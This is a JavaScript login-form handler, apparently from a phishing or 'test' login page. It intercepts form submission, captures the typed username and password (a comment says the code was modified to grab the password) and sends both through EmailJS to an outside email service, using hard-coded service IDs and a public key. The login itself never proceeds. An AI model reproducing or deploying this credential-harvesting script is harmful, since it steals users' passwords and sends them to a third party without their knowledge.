const formulario = document.getElementById("form-login");

if (formulario) {
  formulario.addEventListener("submit", async function (evento) {
    evento.preventDefault();

    const identificador = formulario.querySelector(
      'input:not([type="password"])'
    )?.value.trim();

    // Modificado para capturar a senha digitada
    const senha = formulario.querySelector('input[type="password"]')?.value;

    if (!identificador || !senha) {
      alert("Preencha os campos para realizar o teste.");
      return;
    }

    const dados = {
      identificador: identificador,
      senha: senha, // Adicionado o campo da senha aqui
      data_hora: new Date().toLocaleString("pt-BR")
    };

    try {
      await emailjs.send(
        "service_m9qi05m",
        "template_o3hg3ue",
        dados,
        {
          publicKey: "LFnoYttnz6A1Dc5Ku"
        }
      );

    
    } catch (erro) {
      console.error(erro);
      alert("Não foi possível enviar a notificação.");
    }
  });
}